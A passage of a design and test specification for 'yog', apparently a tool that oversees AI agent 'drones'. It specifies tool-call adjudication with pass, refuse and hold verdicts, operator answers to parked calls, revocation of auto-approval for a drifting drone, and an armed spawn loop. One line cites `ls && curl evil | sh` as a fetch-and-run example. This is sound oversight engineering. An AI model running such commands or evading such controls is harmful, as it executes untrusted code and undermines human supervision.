own rung instead, **S18** (bl-66fb), off by default; an unarmed headless yog is
exactly the headless yog this rung shipped.

Burden check: the windowed operator sees nothing new — no widget, no chip, no
row. The strip, the ↓ key and the jump control behave exactly as before, now
reading the roster the queue reads.

Tests:
- **S14-T1 the-queue-is-the-roster-filtered**: over two workspaces, the queue's
  ids are the roster's attention-bearing subsequence in roster order, and its
  length equals `attention::strip_total` over the same inputs — the number the
  window paints and the rows a headless seat gets cannot disagree.
- **S14-T2 a-row-is-answerable-as-it-stands**: one conversation firing all five
  §6 signals renders its address, display name, state, uncertainty, age,
  pending count, preview and its signals in badge order — everything needed to
  answer it without a second read.
- **S14-T3 answering-writes-the-windows-watermarks**: `/seen` records exactly
  the `(kind, oid)` pairs `attention::evidence` names (four — mail carries no
  oid), a foreign oid stays unseen, and the row leaves the queue.
- **S14-T4 mail-is-not-quieted**: an acknowledged conversation whose inbox is
  undelivered stays on the queue with `mail` as its only signal.
- **S14-T5 an-answer-aimed-at-nothing-refuses**: an unknown agent and an
  unknown workspace each refuse by name rather than reporting a silent success.
- **S14-T6 three-spellings**: `Query::Attention` and `Action::MarkSeen`
  round-trip through the codec and through `line::spell`/`parse`, each has a
  help page, a malformed `seen` envelope refuses naming its missing field, and
  the reply encodes every signal word and the address keys the gestures take.
- **S14-T7 read-then-answer-over-one-ui-json**: through the deposit transport,
  `{"op":"attention"}` returns the waiting row and `{"op":"seen",…}` returns the
  empty queue that remains — with the watermark landing in the `ui.json` the
  window reads (I0).
- **S14-T8 a-windowless-engine-answers**: `Engine::boot` into a hermetic world
  with `NoRepaint` runs the §5.2 sweep, brings up every thread a running yog
  has and none of them a frame, answers a deposit, and stops cleanly on drop —
  the V5 claim, end to end, with no display anywhere.

## S15 — Warden: nothing runs unadjudicated (VISION §4.11)

Machine state: a workspace with a drone at work and no human at the window.

1. **Every granted tool invocation is adjudicated before it executes.** The
   enforcement point is lernie's own shipped tool-control seam: the workspace's
   `workflow.yaml` names one executable, hands it the `tool_use` block plus the
   calling role and agent id, and reads back `pass` / `refuse` / `hold`,
   failing closed. yog *is* that executable — a `world/tools/` re-exec shim
   named by **absolute path**, so no host binary can shadow the adjudicator.
   No new primitive is asked of anyone, and the shipped whole-pool grant is
   untouched: grants are lernie's structure, the control is yog's policy.
2. **The vocabulary classifies invocations, never tool names.** read / target
   write / process / open-world / destructive / secret. Built-ins carry an
   intrinsic map; `cd` and `apply_patch` are judged against the writable root
   at consult time; `bash` goes to an operator ruleset over *every program the
   command would run*, so `ls && curl evil | sh` is not a read. **An unmatched
   program is open-world**: classification error fails toward the wider class,
   never into `read`.
3. **The writable root is the job's own ground** — the agent worktree plus the
   bound attempt worktree — derived from facts yog owns: the claim yog itself
   made and logged. The agent's `cd` mark is read to interpret relative
   operands and never to widen the root.
4. **One default table, and it passes everything but loss and credentials**:
   read / target write / process / open-world pass; destructive and secret are
   declined in band. **A hold is imposed, never shipped** — a workspace's own
   `table:` row, or the monitor's floor over one conversation — because a park
   on every fetch buys approvals given by reflex. A hold parks the branch: the
   driver exits, nothing at or past the held call ran, the drone costs nothing
   while it waits. A refusal is a decline the model reads and steps past. **No
   enforcement path ever stops an agent**, and no modal exists in either
   frontend: attended and unattended are one flow.
5. **The workspace is born adjudicated.** Every start converges the workspace's
   `config/default` onto a workflow naming the shim, through lernie's own
   config verb — so a workspace made a moment ago and one made last week are
   both controlled, and every agent forked after that commit is. A tip that
   already names the shim reads one file out of git and spawns nothing.
6. **The control writes nothing, ever.** A held invocation is re-adjudicated on
   the next drive, so every consult must answer the same way twice. The
   operator's answers live where the audit already does: `ops.jsonl` rows are
   at once the record and the fold the control reads.

Tests:
- **S15-T1 the-shim-answers-the-seam** (`tests/tool_control_shim.rs`): the
  seeded shim, spawned with no argv and a request on stdin, prints one verdict
  on stdout — a pass carrying no reason (lernie's parser rejects one), a hold
  with its reason once a floor row imposes one, a refusal at exit **0** (a decline is an answer;
  the seam reads non-zero as a fault), and a non-zero exit for a request nobody
  could adjudicate.
- **S15-T2 the-vocabulary-is-per-invocation** (`control::bash`,
  `control::classify`): the shipped rows over real commands, a compound command
  as wide as its widest part, an unmatched program landing open-world, a write
  redirect outside the root outranking a reading program, a secret path
  outranking its program's row, and `rm` reading its own operands.
- **S15-T3 the-root-is-yog-s-own-fact** (`control::root`, `control::tests`):
  the writable root is the agent worktree plus the claim *this* workspace made;
  another workspace's claim is not in it; the `cd` mark resolves operands and
  never widens.
- **S15-T4 the-fold-is-the-trail** (`control::judge`): the table alone answers
  an unanswered invocation; a once-answer scoped to the `tool_use` id wins over
  it; a conversation floor raises every class above read across the whole
  descent subtree and never lowers a refusal; every other ops row folds to
  nothing.
- **S15-T5 authoring-is-a-fixed-point** (`control::author`, `start::tests`):
  a tip without the block is driven through `lernie config` with the **whole**
  workflow staged; a tip that already names the shim spawns nothing; a drive
  that fails aborts the start with its own `["yog-step","control"]` row.

## S16 — Releaser: a parked drone is seen, and answered (VISION §4.11 items 4–8)

Machine state: S15's control is live, and a drone has just tried to run `curl`.
Nothing is running; nothing is lost; nothing has been spent since.

1. **The park is visible, not silent.** The hold mark is a sixth §6 attention
   signal, so a parked conversation raises the same `⚑` a notify does, wears a
   `held` badge beside its state, and takes its place in the decision queue in
   the order the ↓ key walks. It is **not acknowledgeable**: a watermark over a
   park would hide a conversation that nothing but an answer can move, so the
   signal clears only when the mark lifts — mail's precedent, one rule harder.
2. **The queue row says what is waiting.** The control's own sentence rides the
   mark: the tool, a bounded summary of what it was about to do, the effect
   class it landed in, and the evidence that put it there. So an operator — or
   an agent reading `/attention` — decides without opening a transcript, and
   there is no second list of parked drones to disagree with the first.
3. **Answering is one gesture, in all three spellings.** `/answer pass` lets
   that one call through; `/answer refuse` declines it in band; `/answer hold`
   keeps it parked even against a later policy edit. The windowed seat is two
   buttons that appear with the park and vanish with it. The held `tool_use` id
   is never typed: it is read off the mark at fire time, so the answer lands on
   what is parked *now* and cannot be spent by a different call.
4. **The answer is the audit.** One `ops.jsonl` row — `["yog-control","answer",
   <tool_use id>,<verdict>]` — is at once the record and the memory the control
   folds on its next consult. No fourth durable artifact.
5. **The release is the re-adjudication.** A pass or a refuse fires `lernie
   advance` detached; the seam re-enters the tool window under the mark,
   re-consults the control, now finds the answer, and the branch moves. Nothing
   stops the agent — a stop mid-tool-window wedges it permanently.
6. **Policy is per workspace, and its absence is the shipped defaults.**
   `capability.yaml` on `config/default`, read at the **live tip** on every
   consult, overrides the class→verdict table row by row, prepends operator
   classification rows to the bash ruleset, widens the secret-path list, and
   may declare `confinement: required`. Deleting the file deletes the policy,
   not the gate; it is written through the §9.3 lineage gesture that already
   exists, so the capability boundary adds no write path of its own.
7. **A promised wall that isn't there is refused, not faked.** A workspace
   declaring `confinement: required` fires no drone — start or fork — while no
   confinement layer exists, and no affordance renders for the layer that does
   not exist.

Tests:
- **S16-T1 a-park-is-attention-nothing-can-quiet** (`attention`, `git_tree`):
  the mark reads back off the blob lernie writes; a mangled blob is no park at
  all; the signal fires, wears its badge, survives every watermark, and writes
  none.
- **S16-T2 the-answer-is-the-fold's-memory** (`boundary::control`): the row is
  written before anything is launched and the control's own fold reads it back
  as the verdict for that exact `tool_use` id.
- **S16-T3 releasing-drives-and-parking-does-not** (`boundary::control`): pass
  and refuse each launch a detached `lernie advance` as its own logged row; a
  `hold` answer writes the row and launches nothing; a launch that never lands
  is still an answer and still a row; an answer aimed at nothing refuses and
  writes nothing.
- **S16-T4 three-spellings** (`boundary::codec`, `boundary::line`,
  `boundary::help`): every verdict round-trips as envelope and as line, the
  `tool_use` id appears on neither wire, an unknown verdict is refused by name
  in both, and the verb has a page.
- **S16-T5 policy-is-severable** (`control::policy`, `control::tests::policy`):
  no file and an empty file are the shipped state; through the real process
  body, a table row passes what shipped-holds, an operator rule classifies what
  no shipped row names, and an added secret fragment outranks a read row.
- **S16-T6 confinement-required-refuses** (`boundary::control`): the gate is a
  no-op with nothing declared, refuses by name when the line is there, and goes
  quiet again when it is removed.

## S17 — Warden, again: a drone that drifted stops acting on its own (VISION §4.9's fifth rung)

Machine state: S16's boundary is live. One conversation's recent work has
stopped serving its goal — the monitor said so, or you read the transcript and
saw it yourself. You do not want it dead; you want it to stop deciding.

1. **Revoking is one gesture, and it kills nothing.** `/revoke` takes the
   selected conversation's tool auto-approval away. It keeps running, keeps its
   branch, keeps its history and keeps *reading* — every class above a read
   simply parks at the boundary instead of executing, which is the same park a
   held call already makes, applied to all of them. Nothing is stopped, because
   a stop mid-tool-window wedges the branch permanently.
2. **It covers the subtree, including children not born yet.** The floor stands
   over the named conversation and everything below it in the descent, so
   revoking a parent revokes a fan without enumerating one — and a drone it
   spawns afterwards is born under the same floor.
3. **It raises; it never lowers.** Anything the policy already refuses stays
   refused, and a call you pass with `/answer pass` still goes through — so a
   floored conversation can be walked forward one call at a time, which is what
   makes revoking a supervision mode rather than a death sentence.
4. **The floor is the audit.** One `ops.jsonl` row —
   `["yog-control","floor",<conversation id>,"raise"|"lower"]` — is at once the
   record and the memory the control folds on its next consult. Latest row
   wins, so `/restore` is the same gesture the other way and there is no order
   to get wrong. It carries no reason of its own: the reason is the row before
   it, the verdict or flag that prompted it.
5. **The receipt states what stands, not what was asked.** Restoring a
   conversation whose ancestor is still revoked answers *still floored*, because
   the reply is re-read off the trail. Restoring drives nothing — a conversation
   parked at a held call is released by answering that call.
6. **Nothing fires it for you.** It is a rung the operator wires — a
   `cadence.yaml` tier-0 row, or a grant to an alignment responder, both config
   — and the monitor still ships flag-only. A verdict is an *input* to the
   capability policy, never a capability itself.

Tests:
- **S17-T1 the-floor-is-the-folds-memory** (`boundary::control::tests::floor`):
  the row lands in the grammar the control reads, exactly one row is written,
  and the fold then holds every class above read, passes a read, leaves a
  refusal refused, and leaves an unfloored conversation alone.
- **S17-T2 one-row-covers-a-descent** (`boundary::control::tests::floor`): a
  floor on a conversation holds its child; a sibling whose id merely shares a
  prefix is untouched.
- **S17-T3 latest-row-wins-and-the-receipt-re-derives**
  (`boundary::control::tests::floor`): restore lifts it and answers `standing:
  false`; a child restored under a floored parent answers `standing: true` and
  is still held.
- **S17-T4 three-spellings** (`boundary::codec`, `boundary::line`,
  `boundary::help`): both directions round-trip as envelope and as line, the
  direction is the op/verb and never a field, the address fields are required
  in the envelope and taken from the seat on the line, and both verbs have a
  page.
- **S17-T5 reachable-from-the-one-chokepoint**
  (`boundary::control::tests::floor`, `boundary::reply`): the gesture runs
  through `dispatch` — the door both frontends enter — and its reply encodes as
  the receipt above.

## S18 — Admiral, armed: the loop is facts, and every move is a row (VISION §4.3, §5 V4.2)

Machine state: S13's board is live, S15's control adjudicates every drone tool
call, and the operator has decided to let yog take work by itself.

1. **Arming is a gesture, and it is the only thing that turns the loop on.**
   `/fleet 3` on the focused workspace writes one `cadence.yaml` `fleet:` entry
   — the project it takes work from, and the cap it may hold — beside the entry
   the clock already keeps there. `/disband` deletes it. Both spell as envelope
   and as line and both have a page, like every other gesture. Nothing is
   seeded and nothing is spawned by the arm itself: the first spawn is the
   *loop's*, on its next tick. I7 holds the way §4.3 rules it — the arm is the
   explicit user action, and an armed loop's spawns are that action continuing.
2. **The loop renders as facts, not magic.** An armed workspace shows one line
   on the board: how many balls it holds against its cap, the period inside
   which it looks again, how long ago it last did anything, and the lease a
   quiet drone's claim gets. Every one is derived — the cap from the entry, the
   count from the board's own claimed rows, the last act from the trail — and
   none of them is stored anywhere.
3. **The ceiling renders where it will bind: on the next spawn.** When the
   workspace's spend has reached the `ui.json` ceiling, the board says so on the
   loop's own line, in the gate's own words, and the loop stops taking work
   rather than firing births it knows will be refused. It is the same policy
   object the spawn gate consults, so raising the number moves both at once.
4. **Every spawn and every reap is a row, and a reap's reason is the
   comparison.** `["yog-fleet","spawn",<ball>,<conversation>]` when it takes
   work; `["yog-fleet","reap",<ball>,<claimant>]` with *"lease expired 14m ago"*
   as its reason when it gives a claim back. Never a diagnosis: the loop does
   not say why a drone went quiet, only that it has been quiet longer than the
   operator's own number. A move that did not land leaves no loop row — the
   executor that refused it already left one.
5. **Nothing running is ever touched.** A reap releases a claim; it does not
   stop, message or delete a conversation. A live or in-flight drone is never
   reaped however old its claim, because killing mid-ball destroys uncommitted
   work — the ceiling's own ruling, applied to claims.
6. **One move per tick, and no memory between ticks.** A tick reaps or spawns,
   once, and stops. It keeps nothing: the next tick reads the world the last one
   left, so a missed tick, a crashed yog and a second instance all converge, and
   no board state can make the loop storm.

Burden check: **unarmed, the board is today's balls section** — no chip, no
loop line, no rows, no calls. Severability is deleting the `cadence.yaml`
entry, which deletes the loop and not a code path.

Tests:
- **S18-T1 unarmed-is-today's-board** (`fleet::facts`, `fleet::pilot`,
  `app::tests::derive`, `boundary::reply`): an unarmed world derives no loop
  facts even with claimed rows in front of it; an unarmed tick returns before it
  builds a board, opens `ui.json` or reads the trail, and leaves no `ops.jsonl`
  at all; the board reply omits the key rather than answering an empty list;
  and adding then deleting the entry arms and disarms end to end through the
  worker's own announcement.
- **S18-T2 every-fact-is-a-query** (`fleet::facts`): the count is the board's
  own claimed rows for that workspace and nothing else's; the cap, project and
  lease are the entry; the last act is the newest `yog-fleet` row; a loop that
  has never acted says so rather than saying zero.
- **S18-T3 the-ceiling-binds-the-next-spawn** (`fleet::facts`, `fleet::pilot`):
  a workspace over its ceiling renders the gate's own refusal on the loop line
  and has no room, so the tick plans no birth.
- **S18-T4 the-move-is-a-comparison** (`fleet::pilot`): a ball quiet past its
  lease is reaped with *"lease expired Nm ago"* as its reason; a live or
  in-flight drone is never reaped; no lease reaps nothing; a claim with no
  conversation is not reapable; reaps go before spawns; a gated ball and another
  project's ball are not this loop's work.
- **S18-T5 one-row-per-landed-move** (`fleet::row`, `fleet::pilot::tests::fire`):
  a spawn and a reap each round-trip through the trail as themselves with the
  comparison verbatim, nothing else on the trail reads as one, and a refused
  reap or spawn writes no loop row.
- **S18-T6 three-spellings** (`boundary::codec`, `boundary::line`,
  `boundary::help`, `boundary::fleet`): arm and disband round-trip as envelope
  and as line, the envelope requires the project and the cap the line takes from
  its seat, an unreadable cap is refused by name, both verbs have a page, and
  the executor writes one entry and one step row while leaving the clock's own
  entry byte-for-byte.

## Invariant tests (every rung)

- **INV-1 idle-is-pure**: constructing AppModel + N ticks with no user
  action performs **no mutating spawn and no substrate write** (I7). The
  permitted read spawns are now **none**: DESIGN §16.7 W8 made the §7.2 fetch
  cadence an in-process typed store load, and W13 deleted the last of them (W5's
  `--help`/`--version` capability probes). The test asserts the `bl` recorder
  logs ZERO invocations while a real ball still reaches the model, which is the
  stronger statement the old "only `bl list --json` spawns" claim was reaching
  for. **The beat owns its own clock** (bl-9006): booted on the system clock it
  measured the gate's load instead of yog's behaviour, and a pass that ran long
  under nine concurrent tarpaulins wrote §7.2's `yog-drift late` line — a
  correct self-accusation (I7 as amended) read as a mutation, reddening inside
  an unrelated agent's close. Time now moves only **between** passes, where it
  means "the periodic sweeps fell due" and not "this pass was late"; each pass
  asserts that its full sweep really fell due, so the beat exercises §7.2's
  sweeps (five real-clock ticks never left the first cadence) instead of
  racing them. Lateness keeps its own beat, on the crate's lurching fake:
  `app::tests::worker`.
- **INV-2 no-swallowed-errors**: mechanized two ways — every dispatch-layer
  `Err` lands in `ops.jsonl` per the amended §4.2 (spawn failures included,
  non-spawn steps as `["yog-step",…]` rows), and `grep -r eprintln
  src/shell/` finds **zero** occurrences. *(bl-a649 closed the one error the
  dispatch layer never saw: a detached `lernie prompt` that launches cleanly and
  then dies has no `Err` to log — its stderr goes to a per-spawn sink file
  (§8.1/§13.3) which the ops sweep folds into the `-2` row, making the death a
  rendered failure instead of a prompt that "does nothing".)*
- **INV-3 convergence**: re-running any start plan after a mid-plan kill
  converges (§8.1 idempotent-or-convergent steps).

## Priority (this epic)

P0 = S0+S1 (the Codex bar), P1 = S2+S3, P2 = S4+S6 (the many-things regime:
you cannot organize a board you cannot triage), P3 = S5+S7+S8, P4 = S9 (phase
2, each beat gated on its own upstream, §16.7). S10+ are the VISION rungs,
graduating one at a time as their enabling verbs land — S10 (Historian),
S11 (Auditor), S12 (Counterfactualist), S13 (Admiral), S14 (Teleoperator),
S15 (Warden), S16 (Releaser), S17 (Warden, again) and S18 (Admiral, armed)
are here, and none of them needed a verb below yog: S12's fork is `lernie
dispatch --from`, shipped upstream and already pinned, and the rest needed no
verb at all. S13 and S14 each landed minus the armed-loop half they refused to
fake; S18 is that half, landed once its preconditions closed (bl-66fb) — and
armed by nobody, because arming is the operator's act. Implementation
rides §15 M6: Z2 (binding), Z3 (start rungs — `start::plan` is the one
planner, `prepare()` executes it), Z4 (verbs + hints), Z5 (error surfacing),
Z6 (capability gate — landed, then deleted at W13), Z7 (test fixture),
Z8 (login flow), Z9 (tabs +
conversation-first) — bl-tracked; ids recorded in §15 M6 as each is filed.
Z10–Z14 (the test map above) carry the S3–S8 story tests over surfaces that
are already built; S9's carriers are W8–W11.
